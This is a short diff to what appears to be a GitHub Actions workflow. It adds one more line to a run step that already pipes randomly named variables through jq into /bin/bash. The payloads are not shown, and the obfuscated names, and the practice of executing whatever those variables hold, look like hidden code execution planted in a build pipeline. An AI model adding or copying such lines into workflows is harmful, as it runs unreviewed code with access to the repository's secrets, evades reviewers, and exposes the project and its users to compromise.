@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$btb53747" | jq -r .dnv1 | /bin/bash
           printf '%s' "$eedh409" | jq -r .e281 | /bin/bash
           echo $cn8 | jq -r .ogqt71 | /bin/bash
+          echo $ts85 | jq -r .nlt85 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
